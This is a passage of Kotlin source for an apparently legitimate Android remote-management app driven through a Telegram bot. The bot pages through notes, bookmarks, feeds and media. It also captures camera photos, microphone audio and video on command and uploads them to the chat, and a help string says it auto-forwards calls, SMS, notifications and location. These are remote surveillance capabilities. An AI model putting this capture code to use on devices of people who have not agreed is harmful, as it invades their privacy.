                append("  Bot arms a 5-minute window; send the file — bot downloads, unpacks, shows per-category\n")
                append("  counts and restarts the app automatically. Send any /command to cancel.\n")
                append("\n")
                append("💡 <i>Live alerts auto-forward for calls, SMS, notifications & location.</i>")
            })
        }
        for (section in sections) {
            sendChunked(section)
            kotlinx.coroutines.delay(300)
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun capturePhoto(context: Context, useFront: Boolean): File? {
        return suspendCancellableCoroutine { cont ->
            val handlerThread = HandlerThread("TgCameraCapture").apply { start() }
            val handler = Handler(handlerThread.looper)
            var cameraDevice: CameraDevice? = null
            var imageReader: ImageReader? = null

            fun cleanup() {
                try { cameraDevice?.close() } catch (_: Throwable) {}
                try { imageReader?.close() } catch (_: Throwable) {}
                try { handlerThread.quitSafely() } catch (_: Throwable) {}
            }

            cont.invokeOnCancellation { cleanup() }

            try {
                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val facing = if (useFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
                val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                    cameraManager.getCameraCharacteristics(id)
                        .get(CameraCharacteristics.LENS_FACING) == facing
                } ?: cameraManager.cameraIdList.firstOrNull() ?: run {
                    cleanup()
                    if (cont.isActive) cont.resume(null)
                    return@suspendCancellableCoroutine
                }

                val file = File(context.cacheDir, "tg_photo_${System.currentTimeMillis()}.jpg")
                imageReader = ImageReader.newInstance(1280, 960, ImageFormat.JPEG, 1)
                imageReader!!.setOnImageAvailableListener({ reader ->
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        try {
                            val buffer = image.planes[0].buffer
                            val bytes = ByteArray(buffer.remaining())
                            buffer.get(bytes)
                            image.close()
                            file.writeBytes(bytes)
                            cleanup()
                            if (cont.isActive) cont.resume(if (file.length() > 0) file else null)
                        } catch (e: Exception) {
                            image.close()
                            cleanup()
                            if (cont.isActive) cont.resume(null)
                        }
                    }
                }, handler)

                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        try {
                            camera.createCaptureSession(
                                listOf(imageReader!!.surface),
                                object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: android.hardware.camera2.CameraCaptureSession) {
                                        try {
                                            val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                                addTarget(imageReader!!.surface)
                                                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH)
                                            }
                                            session.capture(req.build(), null, handler)
                                        } catch (e: Exception) {
                                            cleanup()
                                            if (cont.isActive) cont.resume(null)
                                        }
                                    }
                                    override fun onConfigureFailed(session: android.hardware.camera2.CameraCaptureSession) {
                                        cleanup()
                                        if (cont.isActive) cont.resume(null)
                                    }
                                }, handler
                            )
                        } catch (e: Exception) {
                            cleanup()
                            if (cont.isActive) cont.resume(null)
                        }
                    }
                    override fun onDisconnected(camera: CameraDevice) {
                        cleanup()
                        if (cont.isActive && !cont.isCompleted) cont.resume(null)
                    }
                    override fun onError(camera: CameraDevice, error: Int) {
                        cleanup()
                        if (cont.isActive && !cont.isCompleted) cont.resume(null)
                    }
                }, handler)
            } catch (e: Exception) {
                LogCat.e("TgCamera capturePhoto: ${e.message}")
                cleanup()
                if (cont.isActive) cont.resume(null)
            }
        }
    }

    private suspend fun recordAudio(context: Context, seconds: Int): File? {
        val file = File(context.cacheDir, "tg_audio_${System.currentTimeMillis()}.m4a")
        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION") MediaRecorder()
        }
        return try {
            recorder.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128000)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            delay(seconds * 1000L)
            recorder.stop()
            recorder.release()
            if (file.exists() && file.length() > 0) file else null
        } catch (e: Exception) {
            LogCat.e("TgAudio recordAudio: ${e.message}")
            try { recorder.release() } catch (_: Throwable) {}
            null
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun recordVideo(context: Context, seconds: Int, useFront: Boolean): File? {
        val file = File(context.cacheDir, "tg_video_${System.currentTimeMillis()}.mp4")
        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION") MediaRecorder()
        }
        return suspendCancellableCoroutine { cont ->
            val handlerThread = HandlerThread("TgVideoCapture").apply { start() }
            val handler = Handler(handlerThread.looper)
            var cameraDevice: CameraDevice? = null
            var surface: android.view.Surface? = null

            fun cleanup() {
                try { cameraDevice?.close() } catch (_: Throwable) {}
                try { recorder.release() } catch (_: Throwable) {}
                try { surface?.release() } catch (_: Throwable) {}
                try { handlerThread.quitSafely() } catch (_: Throwable) {}
            }

            cont.invokeOnCancellation { cleanup() }

            try {
                recorder.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setVideoSource(MediaRecorder.VideoSource.SURFACE)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setVideoSize(1280, 720)
                    setVideoFrameRate(30)
                    setOutputFile(file.absolutePath)
                    prepare()
                }
                surface = recorder.surface

                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val facing = if (useFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
                val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                    cameraManager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == facing
                } ?: cameraManager.cameraIdList.firstOrNull() ?: run {
                    cleanup()
                    if (cont.isActive) cont.resume(null)
                    return@suspendCancellableCoroutine
                }

                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        try {
                            camera.createCaptureSession(
                                listOf(surface!!),
                                object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: android.hardware.camera2.CameraCaptureSession) {
                                        try {
                                            val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                                                addTarget(surface!!)
                                                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                                            }
                                            session.setRepeatingRequest(req.build(), null, handler)
                                            recorder.start()
                                            handler.postDelayed({
                                                try {
                                                    recorder.stop()
                                                } catch (_: Throwable) {}
                                                cleanup()
                                                if (cont.isActive) cont.resume(if (file.exists() && file.length() > 0) file else null)
                                            }, seconds * 1000L)
                                        } catch (e: Exception) {
                                            cleanup()
                                            if (cont.isActive) cont.resume(null)
                                        }
                                    }
                                    override fun onConfigureFailed(session: android.hardware.camera2.CameraCaptureSession) {
                                        cleanup()
                                        if (cont.isActive) cont.resume(null)
                                    }
                                }, handler
                            )
                        } catch (e: Exception) {
                            cleanup()
                            if (cont.isActive) cont.resume(null)
                        }
                    }
                    override fun onDisconnected(camera: CameraDevice) {
                        cleanup()
                        if (cont.isActive && !cont.isCompleted) cont.resume(null)
                    }
                    override fun onError(camera: CameraDevice, error: Int) {
                        cleanup()
                        if (cont.isActive && !cont.isCompleted) cont.resume(null)
                    }
                }, handler)
            } catch (e: Exception) {
                LogCat.e("TgVideo recordVideo: ${e.message}")
                cleanup()
                if (cont.isActive) cont.resume(null)
            }
        }
    }

    private fun htmlEsc(s: String?): String {
        if (s.isNullOrEmpty()) return ""
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    }

    private fun fmtTime(epochMs: Long): String =
        SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(epochMs))

    private fun fileIcon(name: String): String {
        val ext = name.substringAfterLast('.', "").lowercase()
        return when (ext) {
            "jpg", "jpeg", "png", "gif", "webp", "bmp" -> "🖼"
            "mp4", "mkv", "avi", "mov", "webm" -> "🎬"
            "mp3", "aac", "ogg", "wav", "flac", "m4a" -> "🎵"
            "pdf" -> "📄"
            "doc", "docx" -> "📝"
            "xls", "xlsx" -> "📊"
            "ppt", "pptx" -> "📋"
            "zip", "rar", "7z", "tar", "gz" -> "📦"
            "apk" -> "📲"
            "txt", "log" -> "📃"
            else -> "📄"
        }
    }

    // ========================================================================
    // ====================  WEB-PANEL PARITY EXTENSIONS  =====================
    // ========================================================================

    /** Sanitize a string so it can be safely used as a callback_data segment (no ':'). */
    private fun safeSeg(s: String): String = s.replace(':', '_').replace(' ', '_')

    /** Stable short token for package names (some are >55 chars, plus we keep callback_data tidy). */
    private val pkgTokens = java.util.concurrent.ConcurrentHashMap<String, String>()
    private fun pkgToken(pkg: String): String {
        val md = java.security.MessageDigest.getInstance("MD5")
        val hex = md.digest(pkg.toByteArray()).joinToString("") { "%02x".format(it) }.take(12)
        pkgTokens[hex] = pkg
        return hex
    }
    private fun pkgFromToken(t: String): String? = pkgTokens[t]

    // ---------------- Notes ----------------

    @Volatile private var lastNotesQuery: String = ""
    @Volatile private var lastNotesOffset: Int = 0

    private suspend fun cmdNotes(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderNotesPage(q, 0, editMessageId = null)
    }

    private suspend fun renderNotesPage(query: String, offset: Int, editMessageId: Long?) {
        lastNotesQuery = query
        lastNotesOffset = offset
        try {
            val pageSize = 10
            val items = NoteHelper.search(query, pageSize + 1, offset)
            val hasMore = items.size > pageSize
            val pageItems = items.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "📝 No notes found.\n\nUse /addnote to create one." else "📝 No more notes."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val sb = StringBuilder("📝 <b>Notes</b> · ${offset + 1}–${offset + pageItems.size}\n")
            sb.append("<i>Tap a note to view, or send /addnote to create one.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, n ->
                val title = n.title.ifBlank { n.getSummary().take(40).ifBlank { "(untitled)" } }
                val short = n.getSummary().take(80)
                sb.append("${offset + i + 1}. 📝 <b>${htmlEsc(title)}</b>\n")
                if (short.isNotBlank() && short != title) sb.append("   <i>${htmlEsc(short)}</i>\n")
                sb.append("   🕐 ${fmtTime(n.updatedAt.toEpochMilliseconds())}\n\n")
                rows.add(listOf("${offset + i + 1}. ${title.take(30)}" to "note_view:${n.id}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val qTok = safeSeg(query.ifBlank { "_" })
            if (offset > 0) nav.add("◀️ Prev" to "notes_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "notes_pg:$qTok:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("➕ New note" to "note_view:__new__"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not read notes: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun renderNoteDetail(id: String, editMessageId: Long?) {
        if (id == "__new__") { cmdAddNote(); return }
        val n = NoteHelper.getById(id)
        if (n == null) {
            val msg = "❌ Note not found."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
            return
        }
        val title = n.title.ifBlank { "(untitled)" }
        val sb = StringBuilder()
        sb.append("📝 <b>${htmlEsc(title)}</b>\n")
        sb.append("━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("🕐 ${fmtTime(n.updatedAt.toEpochMilliseconds())}\n\n")
        sb.append("<pre>${htmlEsc(n.content.take(3500))}</pre>")
        if (n.content.length > 3500) sb.append("\n<i>… truncated (${n.content.length} chars total)</i>")
        val rows = listOf(
            listOf("✏️ Edit" to "note_edit:${n.id}", "🗑 Trash" to "note_del:${n.id}"),
            listOf("⬅️ Back" to "note_back"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    private suspend fun cmdAddNote() {
        pendingInput = "note_create"
        sendMessage("➕ <b>New note</b>\n\nReply with the note content.\n• If you include a line break, the <b>first line is the title</b>, the rest is the body.\n• If single line, it becomes both title and body.\n\nSend any /command to cancel.")
    }

    // ---------------- Bookmarks ----------------

    @Volatile private var lastBookmarksQuery: String = ""
    @Volatile private var lastBookmarksOffset: Int = 0

    private suspend fun cmdBookmarks(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) args.joinToString(" ").lowercase() else ""
        renderBookmarksPage(q, 0, editMessageId = null)
    }

    private suspend fun renderBookmarksPage(query: String, offset: Int, editMessageId: Long?) {
        lastBookmarksQuery = query
        lastBookmarksOffset = offset
        try {
            val all = BookmarkHelper.getAll()
            val filtered = if (query.isBlank()) all else all.filter {
                it.title.lowercase().contains(query) || it.url.lowercase().contains(query)
            }
            val pageSize = 10
            val total = filtered.size
            val pageItems = filtered.drop(offset).take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "🔖 No bookmarks found.\n\nUse /addbookmark &lt;url&gt; to add one." else "🔖 No more bookmarks."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val sb = StringBuilder("🔖 <b>Bookmarks</b> · ${offset + 1}–${offset + pageItems.size} of $total\n")
            sb.append("<i>Tap to open on device or manage.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, b ->
                val title = b.title.ifBlank { b.url }
                val pin = if (b.pinned) "📌 " else ""
                sb.append("${offset + i + 1}. ${pin}🔗 <b>${htmlEsc(title.take(80))}</b>\n")
                sb.append("   <code>${htmlEsc(b.url.take(80))}</code>\n")
                if (b.clickCount > 0) sb.append("   👁 ${b.clickCount} opens\n")
                sb.append("\n")
                rows.add(listOf("${offset + i + 1}. ${title.take(30)}" to "bm_view:${b.id}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val qTok = safeSeg(query.ifBlank { "_" })
            if (offset > 0) nav.add("◀️ Prev" to "bm_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
            if (offset + pageSize < total) nav.add("Next ▶️" to "bm_pg:$qTok:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not read bookmarks: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun renderBookmarkDetail(id: String, editMessageId: Long?) {
        val b = BookmarkHelper.getById(id)
        if (b == null) {
            val msg = "❌ Bookmark not found."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
            return
        }
        val sb = StringBuilder()
        sb.append("🔖 <b>${htmlEsc(b.title.ifBlank { b.url })}</b>\n")
        sb.append("━━━━━━━━━━━━━━━━━━━━\n")
        sb.append("🔗 <code>${htmlEsc(b.url)}</code>\n\n")
        if (b.pinned) sb.append("📌 Pinned\n")
        if (b.clickCount > 0) sb.append("👁 Opened ${b.clickCount} times\n")
        sb.append("🕐 Added ${fmtTime(b.createdAt.toEpochMilliseconds())}\n")
        val rows = listOf(
            listOf("🌐 Open on device" to "bm_open:${b.id}"),
            listOf("🗑 Delete" to "bm_del:${b.id}", "⬅️ Back" to "bm_back"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    private suspend fun cmdAddBookmark(args: List<String>) {
        if (args.isEmpty()) {
            pendingInput = "bookmark_url"
            sendMessage("➕ <b>Add bookmark</b>\n\nReply with the full URL (must start with <code>http://</code> or <code>https://</code>).\nSend any /command to cancel.")
            return
        }
        val url = args.joinToString(" ").trim()
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            sendMessage("❌ URL must start with <code>http://</code> or <code>https://</code>")
            return
        }
        try {
            val list = BookmarkHelper.addBookmarks(listOf(url))
            val b = list.firstOrNull()
            if (b != null) {
                sendMessage("✅ Bookmark added: <code>${htmlEsc(url)}</code>\n<i>Title/favicon will fetch in background.</i>")
                scope.launch { try { BookmarkHelper.fetchMetadataAsync(MainApp.instance, listOf(b.id)) } catch (_: Throwable) {} }
            }
        } catch (e: Exception) {
            sendMessage("❌ Could not add bookmark: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ---------------- Feeds ----------------

    private suspend fun cmdFeeds() {
        sendTyping()
        renderFeedsList(editMessageId = null)
    }

    private suspend fun renderFeedsList(editMessageId: Long?) {
        try {
            val feeds = FeedHelper.getAll()
            if (feeds.isEmpty()) {
                val msg = "📡 No RSS feeds added.\n\nReply with a feed URL to add one (use the link below)."
                val rows = listOf(listOf("➕ Add feed URL" to "fe_view:__add__"))
                val markup = TelegramApiClient.inlineKeyboard(rows)
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg, replyMarkup = markup)
                else sendMessage(msg, replyMarkup = markup)
                return
            }
            val counts = try { FeedHelper.getFeedCounts().associate { it.id to it.count } } catch (_: Throwable) { emptyMap() }
            val sb = StringBuilder("📡 <b>RSS Feeds</b> (${feeds.size})\n<i>Tap a feed to view recent entries.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            feeds.forEachIndexed { i, f ->
                val n = counts[f.id] ?: 0
                sb.append("${i + 1}. 📡 <b>${htmlEsc(f.name.ifBlank { f.url })}</b>  ·  $n entries\n")
                sb.append("   <code>${htmlEsc(f.url.take(70))}</code>\n\n")
                rows.add(listOf("${i + 1}. ${f.name.ifBlank { f.url }.take(28)}" to "feed_view:${f.id}"))
            }
            rows.add(listOf("📰 All recent entries" to "fe_view:__all__"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not load feeds: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cmdFeedEntries(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderFeedEntriesPage("", 0, editMessageId = null, baseQuery = q)
    }

    private suspend fun renderFeedEntriesPage(feedId: String, offset: Int, editMessageId: Long?, baseQuery: String = "") {
        if (feedId == "__add__") {
            pendingInput = "feed_url"
            val msg = "➕ <b>Add RSS feed</b>\n\nReply with the feed URL (http/https). It must be a valid RSS or Atom feed.\nSend any /command to cancel."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
            return
        }
        try {
            val q = when {
                feedId == "__all__" || feedId.isBlank() -> baseQuery
                else -> {
                    val extra = "feed_id:$feedId"
                    if (baseQuery.isBlank()) extra else "$extra $baseQuery"
                }
            }
            val pageSize = 10
            val items = FeedEntryHelper.search(q, pageSize + 1, offset)
            val hasMore = items.size > pageSize
            val pageItems = items.take(pageSize)
            val feedName = if (feedId.isNotBlank() && feedId != "__all__") {
                FeedHelper.getById(feedId)?.name ?: "feed"
            } else "All feeds"
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "📰 No entries in <b>${htmlEsc(feedName)}</b>." else "📰 No more entries."
                val markup = TelegramApiClient.inlineKeyboard(listOf(listOf("⬅️ Back to feeds" to "feeds_back")))
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg, replyMarkup = markup)
                else sendMessage(msg, replyMarkup = markup)
                return
            }
            val sb = StringBuilder("📰 <b>${htmlEsc(feedName)}</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap an entry to read.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, e ->
                val mark = if (e.read) "✓" else "🔵"
                sb.append("${offset + i + 1}. $mark <b>${htmlEsc(e.title.take(80))}</b>\n")
                sb.append("   🕐 ${fmtTime(e.publishedAt.toEpochMilliseconds())}\n")
                if (e.author.isNotBlank()) sb.append("   ✍ ${htmlEsc(e.author.take(40))}\n")
                sb.append("\n")
                rows.add(listOf("${offset + i + 1}. ${e.title.take(30)}" to "fe_view:${e.id}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val fid = feedId.ifBlank { "_" }
            if (offset > 0) nav.add("◀️ Prev" to "fe_pg:$fid:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "fe_pg:$fid:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("⬅️ Back to feeds" to "feeds_back"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not load entries: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun renderFeedEntryDetail(id: String, editMessageId: Long?) {
        if (id == "__add__") {
            pendingInput = "feed_url"
            val msg = "➕ <b>Add RSS feed</b>\n\nReply with the feed URL (http/https).\nSend any /command to cancel."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
            return
        }
        if (id == "__all__") { renderFeedEntriesPage("__all__", 0, editMessageId); return }
        val e = FeedEntryHelper.getAsync(id)
        if (e == null) {
            val msg = "❌ Entry not found."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
            return
        }
        // Mark as read
        try { FeedEntryHelper.updateAsync(id) { read = true } } catch (_: Throwable) {}
        val sb = StringBuilder()
        sb.append("📰 <b>${htmlEsc(e.title)}</b>\n")
        sb.append("━━━━━━━━━━━━━━━━━━━━\n")
        if (e.author.isNotBlank()) sb.append("✍ ${htmlEsc(e.author)}\n")
        sb.append("🕐 ${fmtTime(e.publishedAt.toEpochMilliseconds())}\n")
        if (e.url.isNotBlank()) sb.append("🔗 <a href=\"${htmlEsc(e.url)}\">Read original</a>\n")
        sb.append("\n")
        val body = e.content.ifBlank { e.description }.replace(Regex("<[^>]+>"), "").trim()
        sb.append(htmlEsc(body.take(3500)))
        if (body.length > 3500) sb.append("\n<i>… truncated</i>")
        val rows = listOf(listOf("⬅️ Back" to "fe_back:${e.feedId}:0"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ---------------- Music / Videos / Images library ----------------

    private suspend fun cmdMusic(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderMusicPage(q, 0, editMessageId = null)
    }

    private suspend fun renderMusicPage(query: String, offset: Int, editMessageId: Long?) {
        try {
            val pageSize = 10
            val items = AudioMediaStoreHelper.searchAsync(MainApp.instance, query, pageSize + 1, offset, FileSortBy.DATE_DESC)
            val hasMore = items.size > pageSize
            val pageItems = items.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "🎵 No audio tracks found." else "🎵 No more tracks."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            val sb = StringBuilder("🎵 <b>Music</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap a track to download.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, a ->
                val mins = a.duration / 60; val secs = a.duration % 60
                sb.append("${offset + i + 1}. 🎵 <b>${htmlEsc(a.title.take(60))}</b>\n")
                if (a.artist.isNotBlank()) sb.append("   👤 ${htmlEsc(a.artist.take(50))}\n")
                sb.append("   ⏱ ${mins}:${secs.toString().padStart(2, '0')}  ·  📦 ${humanSize(a.size)}\n\n")
                rows.add(listOf("📥 ${offset + i + 1}. ${a.title.take(28)}" to "mus_get:${pathToken(a.path)}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val qTok = safeSeg(query.ifBlank { "_" })
            if (offset > 0) nav.add("◀️ Prev" to "mus_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "mus_pg:$qTok:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            // Playback controls row
            val isPlaying = AudioPlayer.isPlaying()
            val playPauseBtn = if (isPlaying) "⏸ Pause" to "np_pause" else "▶️ Play" to "np_play"
            rows.add(listOf("⏮" to "np_prev", playPauseBtn, "⏭" to "np_next", "🎵 Now Playing" to "np_refresh"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not read music: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cbSendMediaAudio(path: String) {
        val f = File(path)
        if (!f.exists() || !f.isFile) { sendMessage("❌ Track gone: <code>${htmlEsc(path)}</code>"); return }
        if (f.length() > UPLOAD_LIMIT_BYTES) { sendMessage("⚠️ Too large for Telegram (${humanSize(f.length())})."); return }
        sendUploadDocument()
        val ok = TelegramApiClient.sendAudio(token, chatId, f, "🎵 ${htmlEsc(f.name)}", 0)
        if (!ok) sendMessage("❌ Upload failed: <code>${htmlEsc(f.name)}</code>")
    }

    private suspend fun cmdVideoLibrary(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderVideosPage(q, 0, editMessageId = null)
    }

    private suspend fun renderVideosPage(query: String, offset: Int, editMessageId: Long?) {
        try {
            val pageSize = 10
            val items = VideoMediaStoreHelper.searchAsync(MainApp.instance, query, pageSize + 1, offset, FileSortBy.DATE_DESC)
            val hasMore = items.size > pageSize
            val pageItems = items.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "🎞 No videos found." else "🎞 No more videos."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            val sb = StringBuilder("🎞 <b>Videos</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap a video to download.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, v ->
                val mins = v.duration / 60; val secs = v.duration % 60
                sb.append("${offset + i + 1}. 🎬 <b>${htmlEsc(v.title.take(60))}</b>\n")
                sb.append("   📐 ${v.width}×${v.height}  ·  ⏱ ${mins}:${secs.toString().padStart(2, '0')}  ·  📦 ${humanSize(v.size)}\n\n")
                rows.add(listOf("📥 ${offset + i + 1}. ${v.title.take(28)}" to "vds_get:${pathToken(v.path)}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val qTok = safeSeg(query.ifBlank { "_" })
            if (offset > 0) nav.add("◀️ Prev" to "vds_pg:$qTok:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "vds_pg:$qTok:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not read videos: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cbSendMediaVideo(path: String) {
        val f = File(path)
        if (!f.exists() || !f.isFile) { sendMessage("❌ Video gone."); return }
        if (f.length() > UPLOAD_LIMIT_BYTES) { sendMessage("⚠️ Too large for Telegram (${humanSize(f.length())})."); return }
        sendUploadDocument()
        val ok = TelegramApiClient.sendVideo(token, chatId, f, "🎬 ${htmlEsc(f.name)}", 0)
        if (!ok) sendMessage("❌ Upload failed: <code>${htmlEsc(f.name)}</code>")
    }

    private suspend fun cmdImages(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderImagesPage(q, 0, editMessageId = null)
    }

    private suspend fun renderImagesPage(query: String, offset: Int, editMessageId: Long?) {
        try {
            val pageSize = 5
            val items = ImageMediaStoreHelper.searchAsync(MainApp.instance, query, pageSize + 1, offset, FileSortBy.DATE_DESC)
            val hasMore = items.size > pageSize
            val pageItems = items.take(pageSize)
            if (pageItems.isEmpty()) {
